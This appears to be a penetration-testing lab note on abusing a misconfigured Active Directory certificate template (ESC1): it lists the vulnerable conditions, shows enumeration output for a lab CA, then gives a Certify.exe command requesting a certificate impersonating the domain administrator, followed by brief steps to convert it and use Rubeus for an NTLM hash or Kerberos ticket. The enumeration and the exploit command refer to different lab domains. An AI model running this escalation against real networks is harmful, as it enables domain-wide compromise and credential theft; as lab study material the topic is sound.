The vulnerability happens when a certificate template has:

1. The certificate template allows the **enrollee to supply subject information**.
2. **Client Authentication** EKU
3. **Any user** (like `Domain Users`) has **Enroll** rights.
4. No **manager approval** required


```bash
 5
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : LOL-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-07-17T00:15:41+00:00
    Template Last Modified              : 2025-07-17T00:15:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOL.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : LOL.LOCAL\Enterprise Admins
        Full Control Principals         : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
        Write Owner Principals          : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
        Write Dacl Principals           : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LOL.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

---

We can request a certificate for the domain administrator.
```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
```

then convert to PFX

then Use Rubeus to either request NTLM hash directly or get a Kerberos TGT